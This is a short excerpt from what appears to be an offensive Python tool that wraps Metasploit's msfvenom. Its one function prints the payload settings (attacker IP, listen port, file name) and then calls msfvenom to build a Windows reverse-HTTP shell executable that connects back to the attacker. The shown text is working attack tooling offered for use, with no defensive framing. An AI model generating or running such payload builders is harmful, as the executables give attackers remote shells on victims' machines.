...
def win_net_http():
    os.system("clear")
    print(banner)
    print("Using: windows/shell/reverse_http")
    ...
    print("+--------------------------------------------+ ")
    print("+-> Payload data")
    print("+-> Payload: windows/shell/reverse_http")
    print("+-> Attacker IP: "+ip+"")
    print("+-> Listen Port: "+port+"")
    print("+-> Name: "+name+"")
    print("+--------------------------------------------+ ")
    print("Creating payload [01]")
    os.system("msfvenom -p windows/shell/reverse_http LHOST="+ip+" LPORT="+port+" -f exe >> "+name+".exe")
